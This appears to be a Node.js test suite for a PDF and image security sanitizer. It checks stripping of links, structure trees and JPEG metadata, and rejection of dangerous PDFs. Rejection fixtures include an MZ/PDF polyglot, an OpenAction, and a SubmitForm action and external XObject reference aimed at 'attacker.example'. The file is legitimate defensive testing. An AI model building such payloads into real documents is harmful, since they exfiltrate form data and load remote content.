const assert = require("node:assert/strict");
const test = require("node:test");
const {
  PDFDocument,
  PDFDict,
  PDFName,
  PDFString,
  StandardFonts,
} = require("pdf-lib");
const sharp = require("sharp");
const {
  PdfImageDocumentSecurityScanner,
} = require("../dist/documents/pdf-image-document-security-scanner.js");

test("parses and rewrites a safe PDF", async () => {
  const source = await PDFDocument.create();
  source.addPage([595, 842]);
  const bytes = await source.save();
  const scanner = new PdfImageDocumentSecurityScanner();

  const sanitized = await scanner.sanitize({
    bytes,
    mimeType: "application/pdf",
  });
  const parsed = await PDFDocument.load(sanitized);
  assert.equal(parsed.getPageCount(), 1);
  assert.equal(Buffer.from(sanitized).subarray(0, 5).toString(), "%PDF-");
});

test("accepts and strips an empty annotations array from a textual PDF", async () => {
  const source = await PDFDocument.create();
  const page = source.addPage([595, 842]);
  const font = await source.embedFont(StandardFonts.Helvetica);
  page.drawText("Orange facture montant total", { x: 40, y: 780, font });
  page.node.set(PDFName.of("Annots"), source.context.obj([]));

  const sanitized = await new PdfImageDocumentSecurityScanner().sanitize({
    bytes: await source.save(),
    mimeType: "application/pdf",
  });
  const parsed = await PDFDocument.load(sanitized);

  assert.equal(parsed.getPageCount(), 1);
  assert.equal(parsed.getPage(0).node.has(PDFName.of("Annots")), false);
});

test("accepts and strips an ordinary web link annotation", async () => {
  const source = await PDFDocument.create();
  const page = source.addPage([595, 842]);
  const action = source.context.obj({
    S: PDFName.of("URI"),
    URI: PDFString.of("https://www.fifa.com/regulations"),
  });
  const annotation = source.context.obj({
    Type: PDFName.of("Annot"),
    Subtype: PDFName.of("Link"),
    Rect: [40, 40, 200, 60],
    A: action,
  });
  page.node.set(PDFName.of("Annots"), source.context.obj([annotation]));

  const sanitized = await new PdfImageDocumentSecurityScanner().sanitize({
    bytes: await source.save(),
    mimeType: "application/pdf",
  });
  const parsed = await PDFDocument.load(sanitized);

  assert.equal(parsed.getPage(0).node.has(PDFName.of("Annots")), false);
  assert.equal(
    [...parsed.context.enumerateIndirectObjects()].some(([, object]) =>
      object instanceof PDFDict && object.has(PDFName.of("URI"))),
    false,
  );
});

test("accepts passive accessibility link structure and an empty name tree", async () => {
  const source = await PDFDocument.create();
  const page = source.addPage([595, 842]);
  const accessibilityAttributes = source.context.obj({
    O: PDFName.of("List"),
    ListNumbering: PDFName.of("None"),
  });
  const structureElement = source.context.obj({
    Type: PDFName.of("StructElem"),
    S: PDFName.of("Link"),
    A: accessibilityAttributes,
  });
  source.catalog.set(
    PDFName.of("StructTreeRoot"),
    source.context.obj({ K: [structureElement] }),
  );
  source.catalog.set(
    PDFName.of("Names"),
    source.context.obj({ Names: [] }),
  );

  const sanitized = await new PdfImageDocumentSecurityScanner().sanitize({
    bytes: await source.save(),
    mimeType: "application/pdf",
  });
  const parsed = await PDFDocument.load(sanitized);

  assert.equal(parsed.getPageCount(), 1);
  assert.equal(parsed.catalog.has(PDFName.of("StructTreeRoot")), false);
  assert.equal(parsed.catalog.has(PDFName.of("Names")), false);
  assert.equal(page.getWidth(), 595);
});

test("rejects PDF polyglots and active content", async () => {
  const scanner = new PdfImageDocumentSecurityScanner();
  await assert.rejects(
    scanner.sanitize({
      bytes: Buffer.from("MZ payload\n%PDF-1.7\n%%EOF"),
      mimeType: "application/pdf",
    }),
    /en-tete invalide/,
  );
  await assert.rejects(
    scanner.sanitize({
      bytes: Buffer.from("%PDF-1.7\n1 0 obj << /OpenAction 2 0 R >>\n%%EOF"),
      mimeType: "application/pdf",
    }),
    /actions automatiques/,
  );
});

test("rejects page additional actions and SubmitForm links", async () => {
  const source = await PDFDocument.create();
  const page = source.addPage([595, 842]);
  const submitAction = source.context.obj({
    S: PDFName.of("SubmitForm"),
    F: PDFString.of("https://attacker.example/collect"),
  });
  page.node.set(PDFName.of("AA"), source.context.obj({ O: submitAction }));
  const bytes = await source.save();

  await assert.rejects(
    new PdfImageDocumentSecurityScanner().sanitize({
      bytes,
      mimeType: "application/pdf",
    }),
    /formulaires, liens, annotations/,
  );
});

test("rejects external reference and PostScript XObjects", async () => {
  const scanner = new PdfImageDocumentSecurityScanner();
  for (const subtype of ["Form", "PS"]) {
    const source = await PDFDocument.create();
    const page = source.addPage([595, 842]);
    const xObject = source.context.flateStream("payload", {
      Type: PDFName.of("XObject"),
      Subtype: PDFName.of(subtype),
      ...(subtype === "Form"
        ? {
            Ref: source.context.obj({
              Type: PDFName.of("Filespec"),
              F: PDFString.of("https://attacker.example/external.pdf"),
            }),
          }
        : {}),
    });
    page.node.set(
      PDFName.of("Resources"),
      source.context.obj({ XObject: { X1: source.context.register(xObject) } }),
    );
    await assert.rejects(
      scanner.sanitize({
        bytes: await source.save(),
        mimeType: "application/pdf",
      }),
      /formulaires, liens, annotations/,
    );
  }
});

test("strips image metadata while preserving dimensions", async () => {
  const source = await sharp({
    create: {
      width: 320,
      height: 200,
      channels: 3,
      background: "white",
    },
  })
    .withMetadata({ comment: "private audit metadata" })
    .jpeg()
    .toBuffer();
  const scanner = new PdfImageDocumentSecurityScanner();
  const sanitized = await scanner.sanitize({
    bytes: source,
    mimeType: "image/jpeg",
  });
  const metadata = await sharp(sanitized).metadata();

  assert.equal(metadata.width, 320);
  assert.equal(metadata.height, 200);
  assert.equal(metadata.comments, undefined);
});
